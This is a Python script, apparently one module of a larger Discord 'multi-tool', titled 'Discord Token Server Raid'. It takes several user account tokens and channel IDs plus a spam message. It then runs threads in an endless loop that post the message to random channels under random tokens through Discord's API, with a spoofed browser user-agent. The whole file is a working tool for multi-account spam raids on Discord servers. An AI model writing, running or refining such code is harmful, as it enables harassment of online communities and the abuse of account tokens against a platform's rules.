from Config.Util import *
from Config.Config import *
try:
    import random
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Server Raid")

print()
tokens = ChoiceMultiTokenDisord()

channels = ChoiceMultiChannelDiscord()
message = input(f"{color.RED}{INPUT} Spam Message -> {color.RESET}")
message_len = len(message)
if message_len > 10:
    message_sensur = message[:10]
    message_sensur = message_sensur + "..."
else:
    message_sensur = message

try:
    threads_number = int(input(f"{INPUT} Threads Number (recommended: 2, 4) -> {color.RESET}"))
except:
    ErrorNumber()

def raid():
    try:
        token = random.choice(tokens)
        channel = random.choice(channels)
        response = requests.post(f"https://discord.com/api/channels/{channel}/messages", data={'content': message}, headers={'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Authorization': token})
        response.raise_for_status()
        print(f"{red}[{white}{current_time_hour()}{red}] {ADD} Status: {color.WHITE}Send{color.RED} | Message: {color.WHITE}{message_sensur}{color.RED} | Channel: {color.WHITE}{channel}{color.RED}")
    except:
        print(f"{red}[{white}{current_time_hour()}{red}] {ERROR} Status: {color.WHITE}Error {response.status_code}{color.RED} | Message: {color.WHITE}{message_sensur}{color.RED} | Channel: {color.WHITE}{channel}{color.RED}")

def request():
    threads = []
    try:
        for _ in range(int(threads_number)):
            t = threading.Thread(target=raid)
            t.start()
            threads.append(t)
    except:
        ErrorNumber()

    for thread in threads:
        thread.join()

while True:
    request()